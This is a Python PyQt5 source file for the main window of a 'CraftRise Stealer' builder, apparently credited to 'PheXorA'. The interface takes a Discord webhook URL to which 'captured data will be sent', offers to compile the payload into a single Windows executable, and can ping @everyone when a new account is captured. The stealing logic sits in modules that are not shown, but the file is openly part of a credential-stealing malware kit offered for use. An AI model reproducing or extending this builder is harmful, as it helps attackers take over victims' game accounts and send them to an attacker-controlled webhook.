"""Primary application window."""

from __future__ import annotations

import html
import os
from typing import Optional

from PyQt5.QtCore import Qt
from PyQt5.QtGui import QIcon, QTextCursor
from PyQt5.QtWidgets import (
    QCheckBox,
    QFrame,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QMainWindow,
    QMessageBox,
    QProgressBar,
    QPushButton,
    QSizePolicy,
    QTextEdit,
    QVBoxLayout,
    QWidget,
)

from ..core.webhook import validate_webhook_url
from .builder import BuildThread
from .styles import Colors, get_stylesheet


class MainWindow(QMainWindow):
    """CraftRise Stealer builder interface."""

    _WINDOW_TITLE = "CraftRise Stealer"
    _MIN_WIDTH = 860
    _MIN_HEIGHT = 720
    _START_WIDTH = 960
    _START_HEIGHT = 780

    def __init__(self) -> None:
        super().__init__()
        self.colors = Colors()
        self.build_thread: Optional[BuildThread] = None
        self._setup_window()
        self._setup_ui()

    # ── Window setup ──

    def _setup_window(self) -> None:
        self.setWindowTitle(self._WINDOW_TITLE)
        self.setMinimumSize(self._MIN_WIDTH, self._MIN_HEIGHT)
        self.resize(self._START_WIDTH, self._START_HEIGHT)
        self.setStyleSheet(get_stylesheet(self.colors))
        self.setWindowIcon(self._create_window_icon())

    def _create_window_icon(self) -> QIcon:
        """Return a minimal inline icon."""
        from PyQt5.QtGui import QPixmap, QPainter, QColor, QPen

        size = 64
        pixmap = QPixmap(size, size)
        pixmap.fill(QColor(self.colors.BACKGROUND))

        painter = QPainter(pixmap)
        pen = QPen(QColor(self.colors.PRIMARY))
        pen.setWidth(4)
        painter.setPen(pen)
        painter.drawRoundedRect(8, 8, size - 16, size - 16, 12, 12)
        painter.end()

        return QIcon(pixmap)

    # ── UI assembly ──

    def _setup_ui(self) -> None:
        central = QWidget()
        self.setCentralWidget(central)

        root_layout = QVBoxLayout(central)
        root_layout.setSpacing(18)
        root_layout.setContentsMargins(36, 24, 36, 20)
        root_layout.setAlignment(Qt.AlignTop)

        # Webhook card
        root_layout.addWidget(self._create_webhook_card())

        # Options card
        root_layout.addWidget(self._create_options_card())

        # Actions
        root_layout.addLayout(self._create_action_row())

        # Progress
        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        root_layout.addWidget(self.progress_bar)

        # Log card
        root_layout.addWidget(self._create_log_card(), stretch=1)

        # Footer
        root_layout.addWidget(self._create_footer())

        # Status bar
        self.statusBar().showMessage("Ready")

    def _create_webhook_card(self) -> QFrame:
        card = QFrame()
        card.setObjectName("Card")
        card.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Maximum)
        layout = QVBoxLayout(card)
        layout.setSpacing(10)
        layout.setContentsMargins(18, 18, 18, 18)

        section = QLabel("Webhook Configuration")
        section.setObjectName("SectionLabel")

        self.webhook_input = QLineEdit()
        self.webhook_input.setPlaceholderText("https://discord.com/api/webhooks/…")

        hint = QLabel("Enter a valid Discord webhook URL where captured data will be sent.")
        hint.setObjectName("SubtitleLabel")
        hint.setWordWrap(True)

        layout.addWidget(section)
        layout.addWidget(self.webhook_input)
        layout.addWidget(hint)
        return card

    def _create_options_card(self) -> QFrame:
        card = QFrame()
        card.setObjectName("Card")
        card.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Maximum)
        layout = QVBoxLayout(card)
        layout.setSpacing(10)
        layout.setContentsMargins(18, 18, 18, 18)

        section = QLabel("Build Options")
        section.setObjectName("SectionLabel")

        # ── EXE option ──
        self.exe_checkbox = QCheckBox("Compile to single executable (.exe)")
        self.exe_checkbox.setChecked(True)

        exe_hint = QLabel("Bundles everything into one Windows executable via PyInstaller.")
        exe_hint.setObjectName("SubtitleLabel")
        exe_hint.setWordWrap(True)

        # ── @everyone option ──
        self.everyone_checkbox = QCheckBox("Send @everyone mention on new account")
        self.everyone_checkbox.setChecked(False)

        mention_hint = QLabel("Mentions @everyone in the webhook when a new account is captured.")
        mention_hint.setObjectName("SubtitleLabel")
        mention_hint.setWordWrap(True)

        layout.addWidget(section)
        layout.addWidget(self.exe_checkbox)
        layout.addWidget(exe_hint)
        layout.addSpacing(6)
        layout.addWidget(self.everyone_checkbox)
        layout.addWidget(mention_hint)
        return card

    def _create_action_row(self) -> QHBoxLayout:
        layout = QHBoxLayout()
        layout.setSpacing(12)
        layout.setAlignment(Qt.AlignCenter)

        self.build_button = QPushButton("Build Payload")
        self.build_button.setCursor(Qt.PointingHandCursor)
        self.build_button.setMinimumWidth(160)
        self.build_button.clicked.connect(self._on_build_clicked)

        self.cancel_button = QPushButton("Cancel")
        self.cancel_button.setObjectName("DangerButton")
        self.cancel_button.setCursor(Qt.PointingHandCursor)
        self.cancel_button.setMinimumWidth(120)
        self.cancel_button.setVisible(False)
        self.cancel_button.clicked.connect(self._on_cancel_clicked)

        layout.addWidget(self.build_button)
        layout.addWidget(self.cancel_button)
        return layout

    def _create_log_card(self) -> QFrame:
        card = QFrame()
        card.setObjectName("Card")
        layout = QVBoxLayout(card)
        layout.setSpacing(10)
        layout.setContentsMargins(18, 18, 18, 18)

        section = QLabel("Build Log")
        section.setObjectName("SectionLabel")

        self.log_area = QTextEdit()
        self.log_area.setReadOnly(True)
        self.log_area.setPlaceholderText("Build output will appear here…")

        layout.addWidget(section)
        layout.addWidget(self.log_area)
        return card

    def _create_footer(self) -> QLabel:
        footer = QLabel("by PheXorA · Discord: phexora")
        footer.setObjectName("FooterLabel")
        footer.setAlignment(Qt.AlignCenter)
        return footer

    # ── Actions ──

    def _on_build_clicked(self) -> None:
        raw_url = self.webhook_input.text().strip()

        if not raw_url:
            QMessageBox.warning(self, "Missing Webhook", "Please enter a Discord webhook URL.")
            return

        if not validate_webhook_url(raw_url):
            QMessageBox.warning(
                self,
                "Invalid Webhook",
                "The provided URL does not look like a valid Discord webhook.\n\n"
                "Expected format:\n"
                "https://discord.com/api/webhooks/ID/TOKEN",
            )
            return

        build_dir = os.path.join(
            os.path.dirname(
                os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
            ),
            "build",
        )

        self._set_building_state(True)
        self._clear_log()
        self._log("Build started…", self.colors.INFO)

        self.build_thread = BuildThread(
            webhook_url=raw_url,
            build_dir=build_dir,
            create_exe=self.exe_checkbox.isChecked(),
            mention_everyone=self.everyone_checkbox.isChecked(),
            parent=self,
        )
        self.build_thread.progress.connect(self._on_progress)
        self.build_thread.finished.connect(self._on_build_finished)
        self.build_thread.error.connect(self._on_build_error)
        self.build_thread.start()

    def _on_cancel_clicked(self) -> None:
        if self.build_thread and self.build_thread.isRunning():
            self.build_thread.cancel()
            self._log("Cancellation requested…", self.colors.WARNING)
            self.statusBar().showMessage("Cancelling…")

    def _on_progress(self, percent: int, message: str) -> None:
        self.progress_bar.setValue(percent)
        self._log(message, self.colors.WARNING)
        self.statusBar().showMessage(message)

    def _on_build_finished(self, output_file: str) -> None:
        self.progress_bar.setValue(100)
        self._log(f"Output: {output_file}", self.colors.SUCCESS)
        self._log("Build completed successfully.", self.colors.SUCCESS)
        self.statusBar().showMessage("Build completed")
        self._set_building_state(False)

    def _on_build_error(self, message: str) -> None:
        self.progress_bar.setVisible(False)
        self._log(message, self.colors.ERROR)
        self.statusBar().showMessage("Build failed")
        self._set_building_state(False)
        QMessageBox.critical(self, "Build Error", message)

    # ── Helpers ──

    def _set_building_state(self, building: bool) -> None:
        self.build_button.setVisible(not building)
        self.cancel_button.setVisible(building)
        self.progress_bar.setVisible(building)
        if building:
            self.progress_bar.setValue(0)
        self.webhook_input.setEnabled(not building)
        self.exe_checkbox.setEnabled(not building)
        self.everyone_checkbox.setEnabled(not building)

    def _clear_log(self) -> None:
        self.log_area.clear()

    def _log(self, message: str, color_hex: str) -> None:
        safe_message = html.escape(message)
        self.log_area.append(
            f'<span style="color:{color_hex};">{safe_message}</span>'
        )
        cursor = self.log_area.textCursor()
        cursor.movePosition(QTextCursor.End)
        self.log_area.setTextCursor(cursor)
